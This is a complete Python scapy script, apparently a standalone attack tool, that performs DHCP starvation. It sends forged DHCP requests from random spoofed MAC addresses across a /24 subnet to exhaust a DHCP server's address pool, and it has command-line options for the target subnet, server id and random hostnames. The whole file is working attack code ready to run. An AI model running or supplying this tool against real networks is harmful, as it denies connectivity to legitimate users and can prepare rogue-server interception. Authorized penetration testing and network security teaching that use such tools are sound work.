#!/usr/bin/env python3
# Giuseppe De Marco

# suppress "WARNING: No route found for IPv6 destination :: (no default route?)"
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *

from random_name import random_hostname

def starvit(ip_subnet="192.168.1.",
            start_ip=1,
            end_ip=254,
            server_id="192.168.1.1",
            dst_mac="ff:ff:ff:ff:ff:ff",
            random_hostnames=False,
            timeout=0.2,
            debug=0):
    # Stops scapy from checking return packet originating from any packet that we have sent out
    conf.checkIPaddr = False    
    for ip in range(start_ip, end_ip+1):
        bogus_mac_address = RandMAC()
        requested_ip = ip_subnet + str(ip)
        dhcp_options = [("message-type","request"),
                        ("requested_addr", requested_ip),
                        "end"]
        if server_id:
            dhcp_options.insert(1, ("server_id",server_id))
        
        if random_hostnames:
            rn = random_hostname()
            rname = bytes(rn, encoding='ascii')
            dhcp_options.insert(2, ("hostname", rname))
            
        dhcp_request = Ether(src=bogus_mac_address, dst=dst_mac)\
                           /IP(src="0.0.0.0", dst="255.255.255.255")\
                           /UDP(sport=68, dport=67)\
                           /BOOTP(chaddr=bogus_mac_address)\
                           /DHCP(options=dhcp_options)
        
        sendp(dhcp_request)
        print("Requesting: " + requested_ip)
        if debug: dhcp_request.show()
        time.sleep(timeout)


if __name__=="__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('-subnet', required=True, 
                        help="/24 subnet, example: -subnet 192.168.27.")
    
    parser.add_argument('-start',
                        metavar='N',
                        type=int, 
                        default=1,
                        required=False,
                        help="start ip to request")

    parser.add_argument('-end',
                        metavar='N',
                        type=int, 
                        default=254,
                        help="how many request will be done")

    parser.add_argument('-server_id', required=False, 
                        help="DHCP server id, example: 192.168.27.254")

    parser.add_argument('-random_hostnames', required=False,  action='store_true',
                        help="random client hostnames, othrewise client's hostname will be: ?")

    parser.add_argument('-dst_mac', default="ff:ff:ff:ff:ff:ff", required=False, 
                        help="Destination DHCP MAC address, default: ff:ff:ff:ff:ff:ff")

    parser.add_argument('-timeout', type=float, default=0.2, required=False, 
                        help="seconds to wait between a request and another. example -timeout 0.2")

    parser.add_argument('-debug', action='store_true',
                        help="print packets", required=False)

    args = parser.parse_args()
    
    # run!
    starvit(ip_subnet=args.subnet,
            start_ip=args.start,
            end_ip=args.end,
            server_id=args.server_id,
            dst_mac=args.dst_mac,
            random_hostnames=args.random_hostnames,
            timeout=args.timeout,
            debug=args.debug)
